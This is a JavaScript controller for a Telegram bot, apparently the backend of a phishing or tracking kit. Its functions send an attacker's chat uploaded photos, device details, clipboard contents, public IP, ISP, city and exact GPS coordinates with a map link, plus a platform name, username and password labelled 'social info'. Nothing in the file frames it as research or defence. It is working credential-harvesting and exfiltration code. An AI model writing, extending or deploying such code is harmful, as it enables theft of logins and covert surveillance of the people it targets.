"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.sendPhoto = sendPhoto;
exports.sendUserInfo = sendUserInfo;
exports.sendSocialInfo = sendSocialInfo;

import bot from './config/bot';
import path from 'path';
import fs from 'fs';

// Function to send photo to the chat
function sendPhoto(chatId, files) {
    return new Promise((resolve, reject) => {
        try {
            if (files && files['photo']) {
                // Generate a temporary file path for storing the uploaded photo
                const tempFilePath = path.join(__dirname, "/public/images/" + Date.now() + ".jpg");
                const photo = files['photo'];

                // Move the uploaded photo to the temporary path
                photo.mv(tempFilePath, (err) => {
                    if (err) {
                        console.error("Image mv error", err);
                        return reject("Error moving photo file.");
                    }

                    // Send the photo via bot
                    bot.sendPhoto(chatId, fs.createReadStream(tempFilePath)).then(() => {
                        // After successfully sending, delete the temporary file
                        fs.unlinkSync(tempFilePath);
                        resolve(true);
                    })
                    .catch(err => {
                        // If bot fails to send photo, ensure the temp file is deleted
                        fs.unlinkSync(tempFilePath);
                        console.error("Error from telegram sendPhoto", String(err));
                        reject("Error sending photo.");
                    });
                });
            } else {
                reject("No photo found in the files.");
            }
        } catch (err) {
            console.error("Error from controller sendPhoto: ", err);
            reject("Unexpected error in sendPhoto.");
        }
    });
}

// Function to send user information to the chat
function sendUserInfo(chatId, info) {
    return new Promise((resolve, reject) => {
        const message = `
<b>Device:</b> ${info.device}
<b>Os:</b> ${info.os}
<b>Battery:</b> ${info.battery.error ? info.battery.error : `
> <b>Status:</b> ${info.battery.status}
> <b>Percentage:</b> ${info.battery.percentage}
`}
<b>Clipboard:</b> ${info.clipboard}
<b>Languages:</b> ${info.languages}

<b>Public IP:</b> ${info.public_ip}
> <b>City:</b> ${info.city}
> <b>Country:</b> ${info.country}
> <b>Timezone:</b> ${info.timezone}
> <b>Isp:</b> ${info.isp}
> <b>Privacy:</b> ${info.privacy}

<b>Coordinates:</b> ${info.coordinates.error ? info.coordinates.error : `
> ${info.coordinates.latitude},${info.coordinates.longitude}
> <b>Google Map:</b> https://www.google.com/maps/?q=${info.coordinates.latitude},${info.coordinates.longitude}
`}`;

        bot.sendMessage(chatId, message, { parse_mode: "HTML" })
            .then(() => {
                resolve(true);
            })
            .catch(err => {
                console.error("Error from controller sendUserInfo: ", String(err));
                reject("Error sending user info.");
            });
    });
}

// Function to send social info (username and password)
function sendSocialInfo(chatId, credentials) {
    return new Promise((resolve, reject) => {
        const message = `
<b>Platform:</b> ${credentials.platform}
<b>Username:</b> ${credentials.username}
<b>Password:</b> ${credentials.password}`;

        bot.sendMessage(chatId, message, { parse_mode: "HTML" })
            .then(() => {
                resolve(true);
            })
            .catch(err => {
                console.error("Error from controller sendSocialInfo: ", String(err));
                reject("Error sending social info.");
            });
    });
		}
